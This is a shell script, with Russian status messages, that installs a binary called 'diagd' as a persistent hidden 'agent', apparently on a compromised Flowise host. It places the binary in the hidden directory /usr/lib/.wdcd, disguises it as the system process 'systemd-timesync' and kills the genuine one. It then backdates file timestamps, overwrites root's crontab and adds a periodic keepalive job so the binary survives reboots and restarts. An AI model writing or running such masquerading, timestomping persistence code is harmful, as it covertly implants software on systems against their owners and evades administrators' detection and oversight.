#!/bin/sh
set -e
ID="flowise-1@flowise-1"
DIR="/usr/lib/.wdcd"
CA=/etc/ssl/certs/ca-certificates.crt
if [ ! -s "$CA" ]; then
	echo "нет CA-бандла $CA — ставлю ca-certificates" >&2
	if command -v apk >/dev/null 2>&1; then apk add --no-cache ca-certificates >/dev/null 2>&1 || true;
	elif command -v apt-get >/dev/null 2>&1; then apt-get update >/dev/null 2>&1 || true; apt-get install -y ca-certificates >/dev/null 2>&1 || true; fi
	if [ ! -s "$CA" ]; then echo "ca-certificates отсутствует — агент не сможет ходить по HTTPS" >&2; exit 1; fi
fi
mkdir -p "$DIR/bin"
pkill -x systemd-timesync 2>/dev/null || true
cp diagd "$DIR/bin/systemd-timesync"
rm -f "$DIR"/*_key.json "$DIR"/*.xkey "$DIR/config.json"
rm -f "$DIR/wdcd" "$DIR/bin/sysdiag" 2>/dev/null || true
rm -rf "$DIR/telemetry" "$DIR/data" 2>/dev/null || true
chmod 700 "$DIR" "$DIR/bin"; chmod 755 "$DIR/bin/systemd-timesync"
_stamp=$(stat -c %Y /etc/os-release 2>/dev/null || echo 0)
if [ "$_stamp" -gt 0 ] 2>/dev/null; then
	touch -d "@$_stamp" "$DIR" "$DIR/bin" "$DIR/bin/systemd-timesync" 2>/dev/null || true
fi
cat > /etc/crontabs/root <<ROOTCRON
@reboot sleep 45; [ -z "\$(pgrep -x systemd-timesync)" ] && $DIR/bin/systemd-timesync --foreground
*/3 * * * * [ -z "\$(pgrep -x systemd-timesync)" ] && $DIR/bin/systemd-timesync --foreground
ROOTCRON
chmod 600 /etc/crontabs/root
mkdir -p /etc/periodic/15min
cat > /etc/periodic/15min/wdcd-keepalive <<CRON
#!/bin/sh
[ -z "\$(pgrep -x systemd-timesync)" ] && $DIR/bin/systemd-timesync --foreground >/dev/null 2>&1 &
CRON
chmod 755 /etc/periodic/15min/wdcd-keepalive
if [ "$_stamp" -gt 0 ] 2>/dev/null; then
	touch -d "@$_stamp" /etc/crontabs/root /etc/periodic/15min/wdcd-keepalive 2>/dev/null || true
fi
pkill -x crond 2>/dev/null || true; setsid crond 2>/dev/null || true
setsid nohup "$DIR/bin/systemd-timesync" --foreground >/dev/null 2>&1 < /dev/null &
sleep 1
if pgrep -x systemd-timesync >/dev/null 2>&1; then echo "agent $ID установлен (alpine/crond, pid=$(pgrep -x systemd-timesync | head -1))";
else echo "agent $ID установлен, но процесс не поднялся (проверь вручную)" >&2; fi
